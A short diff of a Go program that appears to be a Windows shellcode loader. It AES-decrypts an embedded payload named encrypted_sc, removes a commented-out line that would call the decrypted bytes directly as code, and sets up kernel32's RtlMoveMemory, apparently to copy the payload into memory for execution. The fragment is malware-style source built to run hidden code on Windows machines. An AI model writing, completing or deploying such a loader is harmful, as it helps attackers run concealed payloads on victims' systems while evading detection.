@@ -43,7 +43,6 @@ func decryptAES(data []byte, key []byte) ([]byte, error) {
 func main() {
 	sc, err := decryptAES(encrypted_sc, key)
 	checkErr(err)
-	// syscall.SyscallN(uintptr(unsafe.Pointer(&sc[0])))
 	kernel32 := windows.NewLazyDLL("kernel32.dll")
 	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
 
